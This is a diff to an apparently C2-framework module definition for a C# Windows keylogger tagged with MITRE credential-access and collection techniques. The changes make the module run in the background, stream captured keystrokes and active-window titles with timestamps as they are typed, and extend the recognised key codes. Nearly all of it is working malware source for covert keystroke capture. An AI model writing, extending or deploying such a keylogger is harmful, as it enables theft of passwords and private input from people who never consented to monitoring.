@@ -13,7 +13,7 @@ description: |
 software: ''
 tactics: [TA0006, TA0009]
 techniques: [T1056.001]
-background: false
+background: true
 output_extension: ''
 needs_admin: false
 opsec_safe: true
@@ -53,8 +53,7 @@ csharp:
         {
             string time = args.Length > 0 ? args[0] : "0";
             int seconds = int.Parse(time);
-            string result = Keylogger.StartKeylogger(seconds);
-            Console.WriteLine(result);
+            Keylogger.StartKeylogger(seconds);
         }
     }
 
@@ -62,22 +61,21 @@ csharp:
     {
         private static HookProc hookproc;
 
-        public static string StartKeylogger(int Seconds)
+        public static void StartKeylogger(int Seconds)
         {
-            Console.WriteLine(String.Format("Starting keylogger for {0} seconds.", Seconds));
-
             IntPtr HookID = IntPtr.Zero;
-            string PreviousActiveWindow = "";
+            IntPtr PreviousWindowHandle = IntPtr.Zero;
             hookproc = (nCode, wParam, lParam) =>
             {
                 try
                 {
-                    var CurrentActiveWindow = GetActiveWindowTitle();
-                    if (CurrentActiveWindow != PreviousActiveWindow)
+                    IntPtr currentHandle = GetForegroundWindow();
+                    if (currentHandle != PreviousWindowHandle)
                     {
-                        Console.WriteLine("\r\n");
-                        PreviousActiveWindow = CurrentActiveWindow;
-                        Console.WriteLine("\r\n" + DateTime.Now + "\r\n" + CurrentActiveWindow + "\r\n--------------------------\r\n");
+                        PreviousWindowHandle = currentHandle;
+                        var CurrentActiveWindow = GetActiveWindowTitle();
+                        Console.Write("[NL][NL]" + DateTime.Now + "[NL]" + CurrentActiveWindow + "[NL]--------------------------[NL]");
+                        Console.Out.Flush();
                     }
                     if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
                     {
@@ -103,7 +101,6 @@ csharp:
                         }
                         Console.Write(append);
                     }
-                    Console.Out.Flush();
                 }
                 catch (Exception e)
                 {
@@ -122,7 +119,8 @@ csharp:
                 {
                     timer.Elapsed += (source, e) =>
                     {
-                        Console.WriteLine(String.Format("\r\n\r\nFinished Keylogger at {0:HH:mm:ss.fff}", DateTime.Now));
+                        Console.Write(String.Format("[NL][NL][*] Finished Keylogger at {0:HH:mm:ss.fff}[NL]", DateTime.Now));
+                        Console.Out.Flush();
                         UnhookWindowsHookEx(HookID);
                         timer.Stop();
                         Forms.Application.Exit();
@@ -131,7 +129,6 @@ csharp:
                     Forms.Application.Run();
                 }
             }
-            return "";
         }
 
         private static int WH_KEYBOARD_LL { get; } = 13;
@@ -377,6 +374,22 @@ csharp:
             RShiftKey = 161,
             LControlKey = 162,
             RControlKey = 163,
+            LMenu = 164,
+            RMenu = 165,
+            OemSemicolon = 186,
+            Oemplus = 187,
+            Oemcomma = 188,
+            OemMinus = 189,
+            OemPeriod = 190,
+            Oem2 = 191,
+            Oemtilde = 192,
+            OemOpenBrackets = 219,
+            OemPipe = 220,
+            OemCloseBrackets = 221,
+            OemQuotes = 222,
+            Escape = 27,
+            Alt = 18,
+            Attn = 246,
         }
 
         [StructLayout(LayoutKind.Sequential)]
@@ -390,29 +403,5 @@ csharp:
         }
     }
   ReferenceSourceLibraries: []
-  ReferenceAssemblies:
-    - Name: mscorlib.dll
-      Location: net40\mscorlib.dll
-      DotNetVersion: Net40
-    - Name: System.dll
-      Location: net40\System.dll
-      DotNetVersion: Net40
-    - Name: System.Core.dll
-      Location: net40\System.Core.dll
-      DotNetVersion: Net40
-    - Name: System.Windows.Forms.dll
-      Location: net40\System.Windows.Forms.dll
-      DotNetVersion: Net40
-    - Name: mscorlib.dll
-      Location: net35\mscorlib.dll
-      DotNetVersion: Net35
-    - Name: System.dll
-      Location: net35\System.dll
-      DotNetVersion: Net35
-    - Name: System.Core.dll
-      Location: net35\System.Core.dll
-      DotNetVersion: Net35
-    - Name: System.Windows.Forms.dll
-      Location: net35\System.Windows.Forms.dll
-      DotNetVersion: Net35
+  ReferenceAssemblies: []
   EmbeddedResources: []
